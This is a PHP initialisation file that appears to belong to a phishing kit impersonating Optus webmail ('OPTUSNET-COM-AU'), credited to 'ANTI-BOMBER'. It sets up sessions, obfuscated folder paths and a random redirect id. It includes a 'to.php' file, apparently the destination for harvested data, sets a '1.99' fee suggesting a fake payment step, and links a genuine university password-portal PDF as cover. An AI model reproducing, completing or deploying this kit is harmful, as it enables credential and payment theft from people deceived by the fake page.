<?php 
/*==========================================================================
* +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Author Name      : ANƬƖ-ƁƠMƁЄƦ 
* [A][и][T][Ɩ] [в][σ][м][в][є][я] Template Name    : O|P|T|U|S|N|E|T|-|C|O|M|-|A|U|
* +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ Template Version : V.1.1 By 🄰🄽🅃🄸-🄱🄾🄼🄱🄴🅁  
===========================================================================*/
	/* Main Rulez Functions */
	ob_start();
	session_start();
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
	@set_time_limit(ini_get('0'));
	header('Content-type: text/html; charset-UTF-8');
	date_default_timezone_set('GMT');

	/* Folder Directory */
	$inc  = './includes/';
	(isset($page) && $page == 'check') ? ($func = './F004f19441/includes/func/functions.php') && ($lang = './F004f19441/includes/langs/en.php') && ($to = './F004f19441/includes/to.php') : ($func = $inc . 'func/functions.php') && ($lang = $inc . 'langs/'.$_SESSION['lang']) && ($to = $inc . 'to.php');
	$css1  = './layout/css/style.css';
	$js  = './layout/js/style.js';
	$font = './layout/img/';
	$img  = './layout/img/';
	$flouss  = '1.99 '.  $_SESSION['flous'];
	$index = './../index.php';
	$favicon = $img . 'favicon.png';
	$id    = "id=".rand(99, 100000000);
    $referer = $_SERVER['HTTP_USER_AGENT'];
	$link = './F004f19441/55933014f.php?'.$id;
	$link2 = 'https://www.hof-university.de/fileadmin/user_upload/it-service/Passwort-SelfService-Portal.pdf;';

	/* Require Files */
	require_once $func;
	require_once $lang;
	require_once $to;
    $user = _user();
    $dir  = "./data/uploads/". $user ."/";
?>